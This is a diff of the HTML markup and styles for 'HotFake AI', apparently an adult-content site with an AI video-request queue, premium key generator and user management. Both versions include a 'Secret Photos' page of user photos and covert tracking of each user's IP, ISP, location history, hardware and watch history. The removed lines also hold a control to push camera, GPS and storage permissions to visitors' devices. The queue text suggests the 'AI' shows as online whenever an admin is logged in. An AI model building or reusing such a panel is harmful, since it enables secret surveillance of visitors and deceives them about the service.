@@ -3,508 +3,104 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>HotFake – Secure Admin Panel</title>
-  <meta name="robots" content="noindex, nofollow">
+  <title>HotFake AI – Master Admin</title>
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet">
   <style>
-    :root { --bg: #07070F; --surf: #0F0F1C; --surf2: #181828; --surf3: #1F1F34; --red: #E63946; --red-h: #c1121f; --green: #2DC653; --text: #F0F0FF; --muted: #6E6E98; --border: rgba(255,255,255,0.07); --radius: 14px; --font: 'Poppins', sans-serif; --ease: .25s cubic-bezier(.4,0,.2,1); --sidebar:260px; }
+    :root { --bg: #07070F; --surf: #0F0F1C; --surf2: #181828; --surf3: #1F1F34; --red: #E63946; --green: #2DC653; --text: #F0F0FF; --muted: #6E6E98; --border: rgba(255,255,255,0.07); --radius: 14px; --font: 'Poppins', sans-serif; --ease: .25s cubic-bezier(.4,0,.2,1); --sidebar:260px; }
     *, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
     body { font-family:var(--font); background:var(--bg); color:var(--text); }
     
-    /* Login & Security Screens */
-    #loginScreen { min-height:100vh; display:flex; align-items:center; justify-content:center; background: radial-gradient(ellipse 80% 60% at 50% 0%, rgba(230,57,70,.2) 0%, transparent 70%); }
-    .login-box { width:100%; max-width:380px; background:var(--surf); border:1px solid var(--border); border-radius:20px; padding:2.5rem 2rem; box-shadow: 0 20px 50px rgba(0,0,0,0.8); }
-    .login-brand { text-align:center; margin-bottom:2rem; }
-    .login-brand h1 { font-size:1.6rem; font-weight:800; letter-spacing:-1px; color: #fff;}
-    
-    label { display:block; font-size:.85rem; color:var(--muted); margin-bottom:.4rem; font-weight:500; }
-    .inp { width:100%; padding:.75rem 1rem; background:var(--surf2); border:1.5px solid var(--border); border-radius:10px; color:var(--text); font-family:var(--font); font-size:.95rem; outline:none; transition: border-color var(--ease); margin-bottom:1rem;}
+    #loginScreen { min-height:100vh; display:flex; align-items:center; justify-content:center; }
+    .login-box { width:100%; max-width:380px; background:var(--surf); border:1px solid var(--border); border-radius:20px; padding:2.5rem 2rem; }
+    .inp { width:100%; padding:.75rem 1rem; background:var(--surf2); border:1px solid var(--border); border-radius:10px; color:var(--text); margin-bottom:1rem; outline:none; }
     .inp:focus { border-color:var(--red); }
-    select.inp { appearance: none; }
+    .btn { display:inline-flex; align-items:center; justify-content:center; gap:.5rem; padding:.7rem 1.4rem; border-radius:10px; font-weight:600; cursor:pointer; border:none; color:#fff;}
+    .btn-red { background:var(--red); } .btn-green { background:var(--green); } .btn-gray { background:var(--surf3); border:1px solid var(--border); } .btn-danger { background:rgba(230,57,70,.12); color:var(--red); border:1px solid rgba(230,57,70,.3); } .btn-full { width:100%; padding:.85rem; }
     
-    .btn { display:inline-flex; align-items:center; justify-content:center; gap:.5rem; padding:.7rem 1.4rem; border-radius:10px; font-family:var(--font); font-size:.9rem; font-weight:600; cursor:pointer; border:none; transition: all var(--ease); }
-    .btn-red { background:var(--red); color:#fff; }
-    .btn-green { background:var(--green); color:#fff; }
-    .btn-gray { background:var(--surf3); color:#fff; border:1px solid var(--border); }
-    .btn-danger { background:rgba(230,57,70,.12); color:var(--red); border:1px solid rgba(230,57,70,.3); }
-    .btn-full { width:100%; padding:.85rem; font-size:1rem; }
-    
-    .checkbox-group { display: flex; flex-wrap: wrap; gap: 12px; background: rgba(0,0,0,0.3); padding: 12px; border-radius: 8px; border: 1px solid var(--border); margin-bottom: 1rem; }
-    .checkbox-group label { display: flex; align-items: center; gap: 6px; cursor: pointer; color: var(--text); font-size: 0.85rem; margin-bottom: 0; }
-    .checkbox-group input[type="checkbox"] { width: 16px; height: 16px; accent-color: var(--red); }
-
     .sidebar { position:fixed; top:0; left:0; bottom:0; width:var(--sidebar); background:var(--surf); border-right:1px solid var(--border); display:flex; flex-direction:column; padding:1.5rem 1rem; z-index:50; }
-    .sidebar-brand { font-size:1.3rem; font-weight:800; color:var(--text); display:flex; align-items:center; gap:.4rem; padding:.5rem .5rem 1.5rem; }
-    .snav { flex:1; overflow-y:auto; }
-    .snav-title { font-size:.72rem; color:var(--muted); font-weight:600; text-transform:uppercase; padding:.25rem .75rem .6rem; margin-top:.5rem; }
-    .slink { display:flex; align-items:center; gap:.75rem; padding:.65rem .75rem; border-radius:10px; color:var(--muted); text-decoration:none; font-size:.9rem; font-weight:500; cursor:pointer; margin-bottom:.15rem; }
-    .slink:hover { background:var(--surf2); color:var(--text); }
-    .slink.active { background:rgba(230,57,70,.15); color:var(--red); }
-    .content { margin-left:var(--sidebar); padding:2.5rem 2rem; min-height:100vh; max-width:1050px; }
-    
+    .snav { flex:1; overflow-y:auto; } .snav-title { font-size:.72rem; color:var(--muted); font-weight:600; text-transform:uppercase; margin-top:.5rem; margin-bottom:.5rem;}
+    .slink { display:flex; padding:.65rem .75rem; border-radius:10px; color:var(--muted); text-decoration:none; font-size:.9rem; cursor:pointer; }
+    .slink:hover { background:var(--surf2); color:var(--text); } .slink.active { background:rgba(230,57,70,.15); color:var(--red); }
+    .content { margin-left:var(--sidebar); padding:2.5rem 2rem; min-height:100vh; }
     .page { display:none; } .page.active { display:block; }
-    .card-panel { background:var(--surf); border:1px solid var(--border); border-radius:var(--radius); padding:1.5rem; margin-bottom: 1.5rem;}
+    .card-panel { background:var(--surf); border:1px solid var(--border); border-radius:var(--radius); padding:1.5rem; margin-bottom: 1.5rem; overflow-x:auto;}
     
     table { width: 100%; border-collapse: collapse; margin-top: 1rem; font-size: 0.9rem;}
     th, td { padding: 12px; text-align: left; border-bottom: 1px solid var(--border); vertical-align: top;}
-    th { color: var(--muted); font-weight: 500; }
-    .badge-banned { background: rgba(230,57,70,0.2); color: #ff8c94; padding: 3px 8px; border-radius: 4px; font-size: 0.75rem;}
-    .badge-active { background: rgba(45,198,83,0.2); color: #6ef59a; padding: 3px 8px; border-radius: 4px; font-size: 0.75rem;}
-
-    /* AI Specific Badges */
+    th { color: var(--muted); }
     .badge { padding: 4px 8px; border-radius: 6px; font-size: 0.75rem; font-weight: 600; display: inline-block; margin-bottom: 5px; }
-    .b-pending { background: rgba(240,173,78,0.2); color: #f0ad4e; }
-    .b-generating { background: rgba(2,117,216,0.2); color: #5bc0de; }
-    .b-error { background: rgba(230,57,70,0.2); color: #ff8c94; }
-    .b-completed { background: rgba(45,198,83,0.2); color: #6ef59a; }
-
-    .modal-wrap { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.85); z-index:1000; align-items:center; justify-content:center; padding:1rem; backdrop-filter: blur(5px);}
-    .modal-box { background:var(--surf); border:1px solid var(--red); border-radius:var(--radius); padding:2rem; width:100%; max-width:950px; max-height:90vh; overflow-y:auto;}
-    
-    .action-row { padding: 8px 10px; border-bottom: 1px solid var(--border); font-size: 0.85rem; display: flex; justify-content: space-between; align-items: center; }
-    .action-row:last-child { border-bottom: none; }
-
-    .adv-grid { display:grid; grid-template-columns:repeat(auto-fit, minmax(200px, 1fr)); gap:10px; background:var(--surf2); padding:1.2rem; border-radius:10px; margin-bottom:1.5rem; font-size:0.85rem;}
-    .adv-grid span { color:var(--text); font-weight:500; display:block; margin-top:2px; font-size:0.95rem;}
-    .adv-grid b { color:var(--muted); font-size:0.75rem; text-transform:uppercase; letter-spacing:0.5px;}
-
-    .photo-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 15px; margin-top: 1.5rem; }
-    .photo-card { background: var(--surf2); padding: 10px; border-radius: 12px; border: 1px solid var(--border); text-align: center; }
-    .photo-card img { width: 100%; height: 180px; object-fit: cover; border-radius: 8px; margin-bottom: 10px; border: 1px solid rgba(255,255,255,0.1); }
-    .photo-card p { font-size: 0.8rem; color: var(--muted); word-break: break-all; margin-bottom: 3px; }
-    
-    @media (max-width:700px) { :root { --sidebar:0px; } .sidebar { display:none; } .content { margin-left:0; padding:1.25rem 1rem; } }
+    .b-pending { background: rgba(240,173,78,0.2); color: #f0ad4e; } .b-generating { background: rgba(2,117,216,0.2); color: #5bc0de; } .b-error { background: rgba(230,57,70,0.2); color: #ff8c94; } .b-completed { background: rgba(45,198,83,0.2); color: #6ef59a; }
   </style>
 </head>
 <body>
 
-<!-- Secure Login Overlay -->
 <div id="loginScreen">
-  <div class="login-box" id="loginFormBox">
-    <div class="login-brand"><h1>▶ Secure Admin</h1></div>
-    <input class="inp" type="email" id="emailInput" placeholder="Admin Email" style="margin-bottom: 0.8rem;">
-    <input class="inp" type="password" id="passInput" placeholder="Password" onkeydown="if(event.key==='Enter') document.getElementById('loginBtn').click()">
+  <div class="login-box">
+    <h1 style="text-align:center; color:#fff; margin-bottom:2rem;">▶ Admin Core</h1>
+    <input class="inp" type="email" id="emailInput" placeholder="Admin Email">
+    <input class="inp" type="password" id="passInput" placeholder="Password">
     <button id="loginBtn" class="btn btn-red btn-full">🔑 Authenticate</button>
-  </div>
-
-  <!-- New Device Verification (Firebase Re-Auth) -->
-  <div class="login-box" id="deviceAuthBox" style="display:none; border-color: var(--red);">
-    <div class="login-brand"><h1 style="color:var(--red);">⚠️ Unrecognized Device</h1></div>
-    <p style="font-size:0.85rem; color:var(--muted); text-align:center; margin-bottom:15px;">Your device identifier has changed. Please re-enter your Firebase Admin Password to trust this device.</p>
-    <input class="inp" type="password" id="loginDevicePassInput" placeholder="Firebase Admin Password">
-    <button id="verifyDevicePassBtn" class="btn btn-green btn-full">✅ Authorize Device</button>
-    <button class="btn btn-gray btn-full" style="margin-top:10px;" onclick="window.location.reload()">Cancel</button>
   </div>
 </div>
 
-<!-- Main Admin Dashboard -->
 <div id="adminDash" style="display:none;">
   <aside class="sidebar">
-    <div class="sidebar-brand"><span style="color:var(--red);">▶</span> HotFake</div>
+    <div style="font-size:1.3rem; font-weight:800; color:#fff; margin-bottom:1.5rem;"><span style="color:var(--red);">▶</span> HotFake AI</div>
     <nav class="snav">
-      
-      <!-- NEW AI QUEUE TAB -->
       <div class="snav-title">AI Engine</div>
-      <a class="slink" data-page="aiQueuePage">🤖 AI Generation Queue</a>
-
-      <div class="snav-title">Content Management</div>
-      <a class="slink active" data-page="addPage">➕ Add Content</a>
-      <a class="slink" data-page="managePage">📋 All Content</a>
-      
-      <div class="snav-title">Premium & Support</div>
-      <a class="slink" data-page="pricingPage">💰 Pricing Control</a>
-      <a class="slink" data-page="pinsPage">👑 Secure Key Gen</a>
-      <a class="slink" data-page="requestsPage">📩 Support Requests</a>
-
-      <div class="snav-title">System & Users</div>
+      <a class="slink active" data-page="aiQueuePage">🤖 AI Generation Queue</a>
+      <div class="snav-title">Security & Access</div>
+      <a class="slink" data-page="approvalsPage">🛡️ Device Approvals</a>
+      <div class="snav-title">System & Logs</div>
       <a class="slink" data-page="usersPage">👥 Users Tracking</a>
       <a class="slink" data-page="photosPage">📸 Secret Photos</a>
-      <a class="slink" data-page="adsPage">💰 Ad System</a>
-
-      <div class="snav-title">Website Setup</div>
-      <a class="slink" data-page="socialPage">🔗 Social Links</a>
-      <a class="slink" data-page="settingsPage">⚙️ Settings & Security</a>
     </nav>
-    <div style="border-top:1px solid var(--border); padding-top:1rem; margin-top:1rem;">
-      <a class="slink" href="index.html" target="_blank">🌐 View Website</a>
-      <a class="slink" id="logoutBtn" style="cursor:pointer; color:#ff8c94;">🚪 Secure Logout</a>
-    </div>
+    <a class="slink" id="logoutBtn" style="color:#ff8c94; margin-top:2rem;">🚪 Secure Logout</a>
   </aside>
 
   <div class="content">
 
-    <!-- AI QUEUE MANAGEMENT PAGE (NEW) -->
-    <div class="page" id="aiQueuePage">
+    <!-- 1. AI QUEUE PAGE -->
+    <div class="page active" id="aiQueuePage">
       <h2>🤖 AI Video Requests</h2>
-      <p style="color:var(--muted); font-size: 0.85rem;">Manage user prompts, set timeouts/errors, and upload final generated videos here.</p>
-      
-      <div class="card-panel" style="margin-top:1.5rem; overflow-x:auto;">
+      <p style="color:var(--muted); font-size: 0.85rem;">As long as you are logged in, the AI GPU is considered "Online" for users.</p>
+      <div class="card-panel">
         <table>
-            <thead><tr>
-                <th>User Details</th>
-                <th style="width: 35%;">Prompt & Image</th>
-                <th>Status</th>
-                <th style="text-align:right;">Admin Actions</th>
-            </tr></thead>
+            <thead><tr><th>User Details</th><th style="width: 35%;">Prompt & Image</th><th>Status</th><th style="text-align:right;">Actions</th></tr></thead>
             <tbody id="aiQueueTbody"></tbody>
         </table>
       </div>
     </div>
-    
-    <!-- ADD CONTENT PAGE -->
-    <div class="page active" id="addPage">
-      <h2>Add New Content</h2>
-      <div class="card-panel" style="margin-top:1.5rem;">
-        <label>Title *</label><input class="inp" type="text" id="vtitle">
-        <label>Thumbnail / Main Image URL *</label><input class="inp" type="url" id="vimage">
-        
-        <div style="display:flex; gap:1rem; flex-wrap:wrap;">
-            <div style="flex:1; min-width:200px;">
-                <label>Category Type</label>
-                <select class="inp" id="vtype">
-                  <option value="external">Normal Video (External)</option>
-                  <option value="embed">Movie Mode (Internal Player)</option>
-                  <option value="image">🖼️ Premium Image / Photo Gallery</option>
-                </select>
-            </div>
-            <div style="flex:1; min-width:200px;">
-                <label>Is it Premium Locked? 👑</label>
-                <select class="inp" id="vPremium" style="border-color:var(--red);">
-                  <option value="false">No (Free Access)</option>
-                  <option value="true">Yes (Premium PIN Required)</option>
-                </select>
-            </div>
-            <div style="flex:1; min-width:200px;">
-                <label>Is it 18+ Adult Content?</label>
-                <select class="inp" id="v18plus">
-                  <option value="false">No (Safe)</option>
-                  <option value="true">Yes (18+)</option>
-                </select>
-            </div>
-        </div>
 
-        <label>Main Video Link (Leave blank if adding parts or if it's an Image)</label>
-        <input class="inp" type="url" id="vlink" placeholder="https://...">
-
-        <label style="margin-top:0.5rem;">Direct Download Link (Backup for App Offline Download)</label>
-        <input class="inp" type="url" id="vDownloadLink" placeholder="https://drive.google.com/uc?export=download&id=...">
-
-        <hr style="border:0; border-top:1px solid var(--border); margin:1.5rem 0;">
-        <h4 style="margin-bottom:1rem;">Episodes / Extra Images</h4>
-        <div id="partsContainer"></div>
-        <button class="btn btn-gray" id="addPartBtn" style="margin-bottom:1.5rem;">+ Add Episode / Image</button>
-        <button class="btn btn-red btn-full" id="saveVidBtn">➕ Publish Content</button>
-      </div>
-    </div>
-
-    <!-- MANAGE CONTENT PAGE -->
-    <div class="page" id="managePage">
-        <h2>Manage All Content</h2>
-        <div class="card-panel" style="margin-top:1.5rem; overflow-x:auto;">
+    <!-- 2. DEVICE APPROVALS PAGE -->
+    <div class="page" id="approvalsPage">
+        <h2>🛡️ Pending Device Approvals</h2>
+        <p style="color:var(--muted); font-size: 0.85rem;">New hardware trying to access the AI Generator. Approve to grant access.</p>
+        <div class="card-panel">
             <table>
-                <thead><tr><th>Title</th><th>Type</th><th>Access</th><th style="text-align:right;">Actions</th></tr></thead>
-                <tbody id="vlistTbody"></tbody>
+                <thead><tr><th>Hardware ID</th><th>Reason / Message</th><th style="text-align:right;">Actions</th></tr></thead>
+                <tbody id="approvalsTbody"></tbody>
             </table>
         </div>
     </div>
 
-    <!-- ⚡ SECURE DYNAMIC PRICING PAGE -->
-    <div class="page" id="pricingPage">
-        <h2>Dynamic Pricing Control</h2>
-        <p style="color:var(--muted); font-size: 0.85rem;">Secured natively by Firebase Authentication.</p>
-        
-        <div class="card-panel" style="margin-top:1.5rem; background: var(--surf2); border-color: var(--red);">
-            <div style="display:flex; gap:1rem; flex-wrap:wrap; margin-bottom:1rem;">
-                <div style="flex:1; min-width:150px;"><label>Monthly (₹)</label><input class="inp" type="number" id="priceMonthly"></div>
-                <div style="flex:1; min-width:150px;"><label>Weekly (₹)</label><input class="inp" type="number" id="priceWeekly"></div>
-                <div style="flex:1; min-width:150px;"><label>Daily (₹)</label><input class="inp" type="number" id="priceDaily"></div>
-            </div>
-            <div style="display:flex; gap:1rem; flex-wrap:wrap; margin-bottom:1rem;">
-                <div style="flex:1; min-width:150px;"><label>Single Video (₹)</label><input class="inp" type="number" id="priceSingleVid"></div>
-                <div style="flex:1; min-width:150px;"><label>Single Image (₹)</label><input class="inp" type="number" id="priceSingleImg"></div>
-            </div>
-
-            <hr style="border:0; border-top:1px solid var(--border); margin:1.5rem 0;">
-
-            <label style="color:var(--red);">🔑 Firebase Admin Password Required for Update</label>
-            <div style="display:flex; gap:10px; max-width: 400px;">
-                <input class="inp" type="password" id="pricingPassInput" placeholder="Firebase Login Password" style="margin-bottom:0;">
-                <button class="btn btn-green" id="verifyPricingBtn">✅ Verify & Update Prices</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- SUPPORT REQUESTS PAGE -->
-    <div class="page" id="requestsPage">
-        <h2>User Support Requests</h2>
-        <div class="card-panel" style="margin-top:1.5rem; overflow-x:auto;">
-            <!-- SUPPORT REQUESTS SEARCH -->
-            <input type="text" id="supportSearch" class="inp" placeholder="🔍 Search User ID, Name or Message..." style="margin-bottom: 1rem; border-color: var(--muted);">
-            
-            <table>
-                <thead><tr><th>User ID</th><th>User Info</th><th>Message</th><th>Location</th><th style="text-align:right;">Actions & Reply</th></tr></thead>
-                <tbody id="requestsTbody"></tbody>
-            </table>
-        </div>
-    </div>
-
-    <!-- 👑 ADVANCED PREMIUM KEYS GENERATOR -->
-    <div class="page" id="pinsPage">
-        <h2 style="color: var(--red);">👑 Advanced Key Generator</h2>
-        
-        <div class="card-panel" style="margin-top:1.5rem; background: var(--surf2); border-color: var(--red);">
-            
-            <div style="display:flex; gap:1rem; flex-wrap:wrap; margin-bottom:1rem;">
-                <div style="flex:1; min-width:250px;">
-                    <label>Key Privilege Level</label>
-                    <select class="inp" id="pinType" onchange="toggleSpecificVideo()">
-                        <option value="master">Master Key (Full Access to ALL Content)</option>
-                        <option value="all_videos">Video Master (Access to ALL Videos)</option>
-                        <option value="all_images">Image Master (Access to ALL Images)</option>
-                        <option value="specific">S-Key (Specific Content Access Only)</option>
-                    </select>
-                </div>
-                <div style="flex:1; min-width:250px; display:none;" id="pinVideoWrapper">
-                    <label>Select Target Content</label>
-                    <select class="inp" id="pinVideoSelect"><option value="">Loading...</option></select>
-                </div>
-            </div>
-
-            <!-- Targeting Filters -->
-            <label style="color:#fff;">🛡️ Strict Environment Targeting</label>
-            <p style="font-size:0.75rem; color:var(--muted); margin-bottom:10px;">Leave unchecked to allow any. If checked, ONLY selected ones can use the key.</p>
-            
-            <label>Allowed Operating Systems</label>
-            <div class="checkbox-group" id="allowedOS">
-                <label><input type="checkbox" value="Android"> Android</label>
-                <label><input type="checkbox" value="iOS"> iOS</label>
-                <label><input type="checkbox" value="Windows"> Windows</label>
-                <label><input type="checkbox" value="MacOS"> MacOS</label>
-                <label><input type="checkbox" value="Linux"> Linux/Kali</label>
-            </div>
-
-            <label>Allowed Browsers</label>
-            <div class="checkbox-group" id="allowedBrowsers">
-                <label><input type="checkbox" value="Chrome"> Chrome</label>
-                <label><input type="checkbox" value="Safari"> Safari</label>
-                <label><input type="checkbox" value="Firefox"> Firefox</label>
-                <label><input type="checkbox" value="Edge"> Edge</label>
-                <label><input type="checkbox" value="Samsung"> Samsung Internet</label>
-            </div>
-
-            <label>Allowed Device Types</label>
-            <div class="checkbox-group" id="allowedDevices">
-                <label><input type="checkbox" value="Mobile"> Phone/Mobile</label>
-                <label><input type="checkbox" value="Tablet"> Tablet/iPad</label>
-                <label><input type="checkbox" value="Desktop"> PC/Laptop</label>
-            </div>
-
-            <div style="display:flex; gap:1rem; flex-wrap:wrap; margin-bottom:1rem;">
-                <div style="flex:1; min-width:250px;">
-                    <label>Target Specific User(s) <span style="font-size: 0.7rem; color:var(--muted);">(Tick to allow)</span></label>
-                    <input type="text" id="userSearch" class="inp" placeholder="🔍 Search ID or Browser..." style="padding: 8px; margin-bottom: 5px;">
-                    <div class="checkbox-group" id="userCheckList" style="max-height: 180px; overflow-y: auto; display: flex; flex-direction: column; gap: 8px; align-items: flex-start; border: 1px solid rgba(255,255,255,0.1);">
-                        <!-- Options generated dynamically -->
-                    </div>
-                </div>
-
-                <div style="flex:1; min-width:100px;">
-                    <label>Usage Limit (Per Key)</label>
-                    <input class="inp" type="number" id="pinLimit" value="1" min="1">
-                    
-                    <label style="margin-top:10px;">Custom PIN String (Optional)</label>
-                    <input class="inp" type="text" id="pinCode" placeholder="e.g. VIP2026">
-                    
-                    <label style="margin-top:10px;">Bulk Quantity (Per Ticked User)</label>
-                    <input class="inp" type="number" id="pinBulkCount" value="1" min="1" max="50">
-                </div>
-            </div>
-
-            <hr style="border:0; border-top:1px solid var(--border); margin:1.5rem 0;">
-
-            <label style="color:var(--red);">🔑 Firebase Admin Password Required for Generation</label>
-            <div style="display:flex; gap:10px; max-width: 400px;">
-                <input class="inp" type="password" id="keygenPassInput" placeholder="Firebase Login Password" style="margin-bottom:0;">
-                <button class="btn btn-red" id="verifyKeyBtn">⚡ Verify & Generate</button>
-            </div>
-
-        </div>
-
-        <div class="card-panel" style="overflow-x:auto;">
-            <table style="margin-top:0;">
-                <thead><tr><th>Key/PIN</th><th>Target OS & Browser</th><th>Limits</th><th style="text-align:right;">Action</th></tr></thead>
-                <tbody id="pinsTbody"></tbody>
-            </table>
-        </div>
-    </div>
-
-    <!-- USERS TRACKING -->
+    <!-- 3. USERS TRACKING -->
     <div class="page" id="usersPage">
-      <h2>Advanced Audience Tracking</h2>
-      <div class="card-panel" style="margin-top:1.5rem; overflow-x:auto;">
-        <!-- USER ID SEARCH -->
-        <input type="text" id="trackSearch" class="inp" placeholder="🔍 Search User ID or Device OS..." style="margin-bottom: 1rem; border-color: var(--muted);">
-        
+      <h2>👥 Audience Tracking</h2>
+      <div class="card-panel">
         <table id="usersTableObj">
-            <thead><tr><th>User ID</th><th>Device OS</th><th>First Visit</th><th>Status</th><th style="text-align:right;">Actions</th></tr></thead>
+            <thead><tr><th>User ID</th><th>Approved?</th><th>First Visit</th><th>Status</th><th style="text-align:right;">Actions</th></tr></thead>
             <tbody id="userTableBody"></tbody>
         </table>
       </div>
     </div>
 
-    <!-- SECRET PHOTOS -->
+    <!-- 4. SECRET PHOTOS -->
     <div class="page" id="photosPage">
-      <div style="display:flex; justify-content:space-between; align-items:center;">
-          <div><h2>📸 Secret User Photos</h2></div>
-          <button class="btn btn-gray" id="refreshPhotosBtn">🔄 Reload Photos</button>
-      </div>
-      <div id="photosLoadingStatus" style="margin-top:1rem; color:var(--red); font-size:0.9rem;"></div>
-      <div class="photo-grid" id="photosGrid"></div>
+      <div style="display:flex; justify-content:space-between;"><h2>📸 Secret Photos</h2><button class="btn btn-gray" id="refreshPhotosBtn">Reload</button></div>
+      <div style="display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 15px; margin-top: 1.5rem;" id="photosGrid"></div>
     </div>
 
-    <!-- AD SYSTEM -->
-    <div class="page" id="adsPage">
-      <h2>Video Ad System</h2>
-      <div class="card-panel" style="margin-top:1.5rem;">
-        <label>Enable Ads in Player?</label>
-        <select class="inp" id="adEnabled">
-            <option value="true">Yes</option>
-            <option value="false">No</option>
-        </select>
-        <label>Ad Media Type</label>
-        <select class="inp" id="adType">
-            <option value="image">Banner Image (JPG/PNG)</option>
-            <option value="video">Direct Video (MP4)</option>
-            <option value="youtube">YouTube Link</option>
-        </select>
-        <label>Ad Source URL</label>
-        <input class="inp" type="url" id="adUrl" placeholder="Link to ad media">
-        <label>Skip Allowed After (Seconds)</label>
-        <input class="inp" type="number" id="adSkip" value="5">
-        <button class="btn btn-red" id="saveAdBtn">💾 Save Ad Settings</button>
-      </div>
-    </div>
-
-    <!-- SOCIAL LINKS -->
-    <div class="page" id="socialPage">
-      <h2>Social Links</h2>
-      <div class="card-panel" style="margin-top:1.5rem;">
-        <label>Discord</label><input class="inp" type="url" id="socDiscord">
-        <label>Telegram</label><input class="inp" type="url" id="socTelegram">
-        <label>WhatsApp</label><input class="inp" type="url" id="socWhatsapp">
-        <label>Instagram</label><input class="inp" type="url" id="socInstagram">
-        <label>X (Twitter)</label><input class="inp" type="url" id="socX">
-        <button class="btn btn-red" id="saveSocBtn">💾 Save Links</button>
-      </div>
-    </div>
-
-    <!-- SETTINGS & SECURITY -->
-    <div class="page" id="settingsPage">
-      <h2>Settings & Security</h2>
-      
-      <div class="card-panel" style="margin-top:1.5rem; border-color:var(--red);">
-          <h3 style="margin-bottom:1rem; color:var(--red);">🛡️ Admin Security Config</h3>
-          <div style="background: rgba(0,0,0,0.4); padding: 12px; border-radius: 8px; border: 1px solid var(--border);">
-              <span style="color:var(--muted); font-size: 0.8rem;">Current Logged-in Admin:</span><br>
-              <strong id="displayAdminEmail" style="color: #fff; font-size: 1.1rem;">Loading...</strong>
-          </div>
-      </div>
-
-      <div class="card-panel">
-          <h3 style="margin-bottom:1rem;">Brand Setup</h3>
-          <label>Website Favicon URL</label>
-          <input class="inp" type="url" id="setFavicon">
-          <label style="margin-top:1rem;">App APK Download Link</label>
-          <input class="inp" type="url" id="setApkLink" placeholder="https://link-to-your-app.apk">
-          <button class="btn btn-gray" id="saveSetBtn" style="margin-top:1rem;">💾 Save Configurations</button>
-      </div>
-
-      <div class="card-panel">
-          <h3 style="color:var(--red);">⚠️ Danger Zone</h3>
-          <p style="color:var(--muted); font-size:.88rem; margin-bottom:1rem;">Firebase cloud se saare videos permanently delete ho jayenge.</p>
-          <button class="btn btn-danger" id="wipeBtn">🗑️ Delete All Videos</button>
-      </div>
-    </div>
-
-  </div>
-</div>
-
-<!-- EDIT MODAL -->
-<div id="editModal" class="modal-wrap">
-  <div class="modal-box">
-    <h3 style="margin-bottom:1rem;">✏️ Edit Content</h3>
-    <input type="hidden" id="editId">
-    <label>Title</label><input class="inp" type="text" id="editTitle">
-    <label>Thumbnail / Main Image URL</label><input class="inp" type="url" id="editImg">
-    <div style="display:flex; gap:1rem; flex-wrap:wrap;">
-        <div style="flex:1; min-width:150px;"><label>Type</label><select class="inp" id="editType"><option value="external">External</option><option value="embed">Movie Mode</option><option value="image">Gallery</option></select></div>
-        <div style="flex:1; min-width:150px;"><label>Premium?</label><select class="inp" id="editPremium" style="border-color:var(--red);"><option value="false">No (Free)</option><option value="true">Yes (Premium)</option></select></div>
-        <div style="flex:1; min-width:150px;"><label>18+?</label><select class="inp" id="edit18plus"><option value="false">No</option><option value="true">Yes</option></select></div>
-    </div>
-    <label>Main URL</label><input class="inp" type="url" id="editLink">
-    <label>Download Link</label><input class="inp" type="url" id="editDownloadLink">
-    <hr style="border:0; border-top:1px solid var(--border); margin:1.5rem 0;">
-    <div id="editPartsContainer"></div>
-    <button class="btn btn-gray" id="editAddPartBtn" style="margin-bottom:1.5rem;">+ Add Episode/Image</button>
-    <div style="display:flex; gap:1rem;">
-      <button class="btn btn-red" id="saveEditBtn" style="flex:1;">Update Content</button>
-      <button class="btn btn-gray" onclick="document.getElementById('editModal').style.display='none'" style="flex:1;">Cancel</button>
-    </div>
-  </div>
-</div>
-
-<!-- USER PROFILE MODAL -->
-<div id="userModal" class="modal-wrap">
-  <div class="modal-box">
-    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:1rem;">
-        <h3 id="umTitle" style="color:var(--red);">User Profile</h3>
-        <button id="banToggleBtn" class="btn btn-red"></button>
-    </div>
-    
-    <div class="adv-grid">
-        <!-- ID SOURCE -->
-        <div style="border-bottom: 1px solid var(--red); padding-bottom: 5px;"><b>ID Source (Root Info)</b><span id="umIdSource" style="color: var(--green);">None</span></div>
-        <div><b>Device Type</b><span id="umType">None</span></div>
-        <div><b>Operating System</b><span id="umOS">None</span></div>
-        <div><b>Browser Info</b><span id="umBrowser">None</span></div>
-        <div><b>Network / ISP</b><span id="umISP">None</span></div>
-        <div><b>Current Location</b><span id="umLocation">None</span></div>
-        <div><b>IP Address</b><span id="umIp">None</span></div>
-        <div><b>Graphics / GPU</b><span id="umGPU" style="font-size:0.8rem;">None</span></div>
-        <div><b>RAM & CPU</b><span id="umHardware">None</span></div>
-        <div><b>Screen & Touch</b><span id="umScreen">None</span></div>
-        <div><b>Timezone & Lang</b><span id="umTz">None</span></div>
-        <div><b>First Visit</b><span id="umFirst">None</span></div>
-        <div><b>Last Active</b><span id="umLast">None</span></div>
-    </div>
-
-    <div style="background:var(--surf3); border:1px solid var(--red); padding:1rem; border-radius:10px; margin-bottom:1.5rem;">
-        <h4 style="margin-bottom:0.5rem; color:#fff;">📡 Live Permission Force (Push to Device)</h4>
-        <div style="display:flex; gap:1.5rem; align-items:center; flex-wrap:wrap;">
-            <label style="display:inline-flex; align-items:center; gap:5px;"><input type="checkbox" id="pushCam"> Camera Access</label>
-            <label style="display:inline-flex; align-items:center; gap:5px;"><input type="checkbox" id="pushLoc"> GPS Location</label>
-            <label style="display:inline-flex; align-items:center; gap:5px;"><input type="checkbox" id="pushStore"> Local Storage</label>
-            <button class="btn btn-red" id="pushPermBtn" style="padding:0.4rem 1rem;">Push Rules Now</button>
-        </div>
-    </div>
-
-    <div style="display:flex; gap:1.5rem; flex-wrap:wrap; margin-bottom:1.5rem;">
-        <div style="flex:1; min-width:250px;">
-            <h4 style="margin-bottom:0.5rem; color:var(--red);">🔴 Live Action Logs</h4>
-            <div style="background:var(--surf2); border:1px solid var(--border); border-radius:8px; max-height:200px; overflow-y:auto;" id="umActionsList"></div>
-        </div>
-        <div style="flex:1; min-width:250px;">
-            <h4 style="margin-bottom:0.5rem; color:#2DC653;">📍 Location History</h4>
-            <div style="background:var(--surf2); border:1px solid var(--border); border-radius:8px; max-height:200px; overflow-y:auto; padding:5px;" id="umLocationHistory"></div>
-        </div>
-        <div style="flex:1; min-width:250px;">
-            <h4 style="margin-bottom:0.5rem;">🎬 Watch History</h4>
